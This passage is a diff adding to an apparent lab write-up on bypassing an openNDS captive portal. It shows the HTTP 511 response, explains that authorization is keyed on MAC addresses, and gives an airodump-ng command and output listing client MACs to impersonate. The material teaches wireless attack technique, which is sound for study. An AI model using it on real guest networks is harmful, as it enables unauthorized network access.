@@ -121,4 +121,17 @@ Date: Sat, 04 Jul 2026 14:41:22 GMT
 -sI combines two options. -I asks for the response headers alone rather than the page body, which is all that is needed to see how the gateway answers an unauthenticated client, and -s keeps the progress meter out of the output.  
 HTTP 511 Network Authentication Required, defined in [RFC 6585](https://www.rfc-editor.org/info/rfc6585/), indicates the client is on the network but has not authenticated. No header names the software, but the splash page returned in the body signs itself openNDS S/N:f09fc2712210, identifying the daemon. Every request receives the same response until openNDS considers the client authorized.  
 
+**Bypassing the Portal by Spoofing a MAC Address**
 
+The mechanism determining authorization is the weakness. Once a client accepts the terms, openNDS adds it to an allow-list keyed on the client's MAC address (Media Access Control). A MAC address is not a secret. It is transmitted in the clear in every frame the client sends, and on an open network those frames have been readable throughout.  
+
+The reconnaissance scan listed three clients on Guest-WiFi, and the same rows come from airodump-ng pinned to channel 6 and filtered to F0:9F:C2:71:22:10, which leaves only the stations associated with that access point:  
+
+```console
+user@debian-thm:~$ sudo airodump-ng -c 6 --bssid F0:9F:C2:71:22:10 wlan0mon
+...
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+ F0:9F:C2:71:22:10  80:18:44:BF:72:47  -41   0 - 1e     0      24
+ F0:9F:C2:71:22:10  B0:72:BF:B0:78:48  -44   0 - 1      0      12
+ F0:9F:C2:71:22:10  B0:72:BF:44:B0:49  -47   0 - 1      0       8
+```
